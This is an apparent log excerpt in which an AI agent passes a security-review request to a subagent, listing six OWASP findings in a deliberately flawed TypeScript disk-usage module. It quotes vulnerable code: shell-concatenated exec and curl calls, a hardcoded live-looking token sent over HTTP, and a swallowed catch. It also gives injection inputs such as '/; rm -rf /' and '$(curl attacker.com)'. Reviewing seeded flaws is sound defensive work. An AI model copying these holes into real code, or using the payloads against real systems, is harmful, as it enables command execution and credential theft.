deliberate parse failures (malformed `stdout` input) would leave no trace in the application's error stream.\n   - Code context:\n     ```ts\n     // review-src/disk-info.ts:55-61\n     try {\n       const parsed = JSON.parse(stdout);\n       writeCache(parsed);\n     } catch (_) {\n       // swallowed\n     }\n     ```\n\n## Request\nValidate these 6 findings against OWASP Top 10. Confirm or revise my initial severity assignments. Identify any cross-cutting attack chains (e.g., injection -> credential exfiltration -> logging evasion as a single exploit path). Flag any findings I may have missed in the reviewed file.\n","uuid":"5be7dcd7-9d77-4675-889a-b48dbcb17def","session_id":"8ffad7d3-d728-4700-aea1-34c9d1d7865b"}
{"type":"user","message":{"role":"user","content":[{"type":"text","text":"## Review Scope\n`review-src/disk-info.ts` -- a disk-usage query module that shells out to `du` and delegates to the `systeminformation` library. The file is review-only UAT material; it is never imported, built, or executed. Review it as-is for real OWASP vulnerabilities in the code-as-written.\n\n## Threat Model Context\n**Assets protected:** internal disk usage data, API tokens/credentials embedded in source.\n**Actors:** any repository reader (token exposure), any caller able to supply a `DiskQuery.mountPath` value (injection, traversal).\n**Attack surface:** the exported `getDiskUsage(query)` function accepts an attacker-controlled string (`query.mountPath`) that flows into two sinks -- `exec('du -sh ' + path, ...)` and `fsSize(path)`. A second injection surface exists in `writeCache` via a `curl` invocation. A hardcoded live API token appears in module scope and is transmitted over plain HTTP.\n**Blast radius:** remote code execution via shell injection; filesystem traversal to read arbitrary paths; credential theft from source/logs; silent failure hiding intrusion events.\n\n## Findings\n\n1. **Command Injection via exec**\n   - File: `review-src/disk-info.ts:35`\n   - Severity (initial): Critical\n   - OWASP category: A03 Injection\n   - Description: `query.mountPath` is attacker-controlled and concatenated directly into the first argument of `exec()`. No sanitisation, allow-list, or `execFile`/`spawn` with argument array is used. Input such as `/; rm -rf /` or `$(curl attacker.com)` executes arbitrary OS commands in the server process.\n   - Code context:\n     ```ts\n     // review-src/disk-info.ts:30-41\n     const path = query.mountPath;\n\n     exec('du -sh ' + path, (err, stdout) => {\n       if (err) {\n         return;\n       }\n       cacheResult(stdout);\n     });\n     ```\n\n2. **Hardcoded Live API Credential**\n   - File: `review-src/disk-info.ts:20`\n   - Severity (initial): Critical\n   - OWASP category: A07 Identification and Authentication Failures\n   - Description: A live API token (`sk_live_...`) is hardcoded at module scope. Any actor with read access to the repository (or its git history) obtains the token. It cannot be rotated without a code change and a history rewrite, and it remains exposed indefinitely in git history even after removal.\n   - Code context:\n     ```ts\n     // review-src/disk-info.ts:20\n     const API_TOKEN = 'sk_live_8f3a2b9c10d44e7fa1b6c2e9d0447aa1';\n     ```\n\n3. **Path Traversal into fsSize**\n   - File: `review-src/disk-info.ts:46`\n   - Severity (initial): Important\n   - OWASP category: A01 Broken Access Control\n   - Description: The same unvalidated `path` from `query.mountPath` is passed directly to `fsSize(path)`. An attacker can supply `../../etc/shadow` or any absolute path to read filesystem metadata outside the intended mount scope. No path canonicalisation, prefix check, or allow-list guards this sink.\n   - Code context:\n     ```ts\n     // review-src/disk-info.ts:46-48\n     const size = await fsSize(path);\n     return { path, size };\n     ```\n\n4. **Plaintext Secret Transmission + Second Injection**\n   - File: `review-src/disk-info.ts:68-69`\n   - Severity (initial): Important\n   - OWASP category: A02 Cryptographic Failures / A03 Injection\n   - Description: `writeCache` constructs an `http://` URL embedding `API_TOKEN` as a query parameter, then passes it to `exec('curl ...')`. Two issues compound: (a) the credential travels over unencrypted HTTP and will appear in server access logs, network captures, and the shell history of any process that inherits the environment; (b) `JSON.stringify(parsed)` is injected into the curl `-d` argument inside single quotes without escaping -- a single-quote character in `parsed` breaks out of the literal and injects additional shell arguments (second A03 injection surface).\n   - Code context:\n     ```ts\n     // review-src/disk-info.ts:67-70\n     function writeCache(parsed: unknown): void {\n       const url = 'http://cache.internal/store?token=' + API_TOKEN;\n       void exec('curl ' + url + \" -d '\" + JSON.stringify(parsed) + \"'\");\n     }\n     ```\n\n5. **Vulnerable Dependency Pin**\n   - File: `review-src/disk-info.ts:10-13` (comment block)\n   - Severity (initial): Important\n   - OWASP category: A06 Vulnerable and Outdated Components\n   - Description: The module declares a dependency pin of `systeminformation@3.42.0`. The source comment explicitly notes this predates command-injection advisories patched in later majors. Pinning to a known-vulnerable version prevents automated tooling (npm audit, Dependabot) from surfacing the issue unless the exact pinned version is in scope. Even if the package is currently a transitive dep, an explicit pin to an advisory-covered version is a supply-chain risk.\n   - Code context:\n     ```ts\n     // review-src/disk-info.ts:10-13\n     //   \"systeminformation\": \"3.42.0\"  -- DEFECT (vulnerable dep pin): this range\n     //   predates the command-injection advisories patched in later majors; an\n     //   outdated/known-vulnerable transitive pin is an OWASP A06 (vulnerable and\n     //   outdated components) issue.\n     import { fsSize } from 'systeminformation';\n     ```\n\n6. **Security Logging Failure (Swallowed Catch)**\n   - File: `review-src/disk-info.ts:55-61`\n   - Severity (initial): Suggestion\n   - OWASP category: A09 Security Logging and Monitoring Failures\n   - Description: `cacheResult` wraps `JSON.parse` and `writeCache` in a try/catch that silently discards every error. Parse failures, network errors from the cache write, and any exception thrown by downstream code all vanish with no log entry. An attacker exploiting the injection in `writeCache` or causing deliberate parse failures (malformed `stdout` input) would leave no trace in the application's error stream.\n   - Code context:\n     ```ts\n     // review-src/disk-info.ts:55-61\n     try {\n       const parsed = JSON.parse(stdout);\n       writeCache(parsed);\n     } catch (_) {\n       // swallowed\n     }\n     ```\n\n## Request\nValidate these 6 findings against OWASP Top 10. Confirm or revise my initial severity assignments. Identify any cross-cutting attack chains (e.g., injection -> credential exfiltration -> logging evasion as a single exploit path). Flag any findings I may have missed in the reviewed file.\n"}]},"parent_tool_use_id":"toolu_01L2bby4oupKpQzLKWRTvLVN","session_id":"8ffad7d3-d728-4700-aea1-34c9d1d7865b","uuid":"74b7b539-38cb-4940-94a2-af7257227d15","timestamp":"2026-06-08T09:25:06.153Z","subagent_type":"lz-advisor:security-reviewer","task_description":"Security review of disk-info.ts"}
